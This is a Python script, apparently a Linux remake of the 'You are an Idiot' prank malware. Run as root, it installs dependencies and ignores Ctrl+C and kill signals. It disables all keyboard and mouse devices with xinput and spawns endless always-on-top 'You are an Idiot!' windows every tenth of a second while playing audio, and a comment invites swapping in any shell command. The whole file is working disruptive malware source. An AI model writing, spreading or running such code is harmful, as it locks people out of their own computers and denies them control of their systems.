import os
import subprocess
import sys
import threading
import time
import random
import tkinter as tk
import signal

def check_root():
    if os.geteuid() != 0:
        print("This script must be run as root.")
        sys.exit(1)

def install_package(package_name):
    try:
        subprocess.check_call(["apt-get", "install", "-y", package_name])
        print(f"{package_name} installed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to install {package_name}: {e}")
        sys.exit(1)

def install_dependencies():
    try:
        # Check if Tkinter is installed by importing it
        import tkinter
    except ImportError:
        print("Tkinter is not installed. Installing Tkinter...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "tk"])
            print("Tkinter installed successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to install Tkinter: {e}")
            sys.exit(1)

    try:
        # Check if pygame is installed by importing it
        import pygame
    except ImportError:
        print("pygame is not installed. Installing pygame...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"])
            print("pygame installed successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to install pygame: {e}")
            sys.exit(1)
    
    try:
        # Check if pynput is installed by importing it
        import pynput
    except ImportError:
        print("pynput is not installed. Installing pynput...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
            print("pynput installed successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to install pynput: {e}")
            sys.exit(1)

    # Check if xinput is installed, if not, install it
    try:
        subprocess.check_call(["xinput", "--version"])
    except FileNotFoundError:
        print("xinput is not installed. Installing xinput...")
        install_package("xinput")

def create_window(x, y):
    root = tk.Tk()
    root.title("Message Window")
    root.geometry(f"300x200+{x}+{y}")
    root.overrideredirect(1)  # Disable window decorations (including the close button)
    root.attributes("-topmost", True)  # Keep the window on top
    message = tk.Label(root, text="You are an Idiot!")
    message.pack(pady=50)
    root.mainloop()

def execute_command_and_play_audio():
    # Replace this command with any Linux command you want to execute
    command = "neofetch"
    subprocess.run(command, shell=True)

    # Play the audio file
    os.environ["SDL_AUDIODRIVER"] = "pulse"
    import pygame
    try:
        pygame.mixer.init()
        pygame.mixer.music.load("you-are-an-idiot.mp3")  # Replace with the path to your audio file
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy():
            time.sleep(1)
    except pygame.error as e:
        print(f"An error occurred while playing audio: {e}")

def prevent_termination():
    def signal_handler(signum, frame):
        print(f"Ignoring signal: {signum}")
    
    # Catch common termination signals
    signal.signal(signal.SIGINT, signal_handler)  # Ctrl+C
    signal.signal(signal.SIGTERM, signal_handler)  # kill command

def disable_input_devices():
    # Disable all keyboard and mouse input devices
    try:
        devices = subprocess.check_output(["xinput", "--list", "--id-only"], universal_newlines=True).split()
        for device in devices:
            subprocess.call(["xinput", "disable", device])
    except subprocess.CalledProcessError as e:
        print(f"Failed to disable input devices: {e}")
        sys.exit(1)

def enable_input_devices():
    # Enable all keyboard and mouse input devices (cleanup function)
    try:
        devices = subprocess.check_output(["xinput", "--list", "--id-only"], universal_newlines=True).split()
        for device in devices:
            subprocess.call(["xinput", "enable", device])
    except subprocess.CalledProcessError as e:
        print(f"Failed to enable input devices: {e}")

def create_windows_in_loop(delay=0.1):
    screen_width = 1920  # Assuming screen width
    screen_height = 1080  # Assuming screen height
    while True:
        try:
            x = random.randint(0, screen_width - 300)  # Random x position
            y = random.randint(0, screen_height - 200)  # Random y position
            threading.Thread(target=create_window, args=(x, y)).start()
            time.sleep(delay)
        except Exception as e:
            print(f"An error occurred: {e}")

if __name__ == "__main__":
    check_root()  # Ensure the script is run as root
    install_dependencies()  # Check and install Tkinter, pygame, pynput, and xinput if necessary
    prevent_termination()  # Prevent the script from being terminated easily
    disable_input_devices()  # Disable keyboard and mouse input devices

    try:
        create_windows_in_loop(delay=0.1)  # Adjust the delay as needed
    finally:
        enable_input_devices()  # Re-enable input devices when the script exits
